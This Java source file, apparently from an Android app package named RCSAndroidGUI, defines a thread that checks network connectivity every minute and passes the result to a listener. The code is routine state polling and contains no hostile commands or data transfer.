package com.ht.RCSAndroidGUI.listener;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import com.ht.RCSAndroidGUI.Connectivity;
import com.ht.RCSAndroidGUI.Status;

// Falso broadcast, e' generato da noi
public class BroadcastMonitorConnectivity extends Thread {
	/** The Constant TAG. */
	private static final String TAG = "BroadcastMonitorConnectivity";

	private boolean stop;
	private int period;

	public BroadcastMonitorConnectivity() {
		stop = false;
		period = 60000; // Poll interval
	}

	synchronized public void run() {
		do {
			if (stop) {
				return;
			}

			ConnectivityManager connectivityManager = (ConnectivityManager) Status.getAppContext().getSystemService(
					Context.CONNECTIVITY_SERVICE);

			NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();

			if (activeNetworkInfo != null)
				onReceive(activeNetworkInfo.isConnected());
			else
				onReceive(false);
			
			try {
				wait(period);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} while (true);
	}

	public void onReceive(boolean isConnected) {
		ListenerConnectivity.self().dispatch(new Connectivity(isConnected));
	}

	void register() {
		stop = false;
	}

	synchronized void unregister() {
		stop = true;
		notify();
	}
}
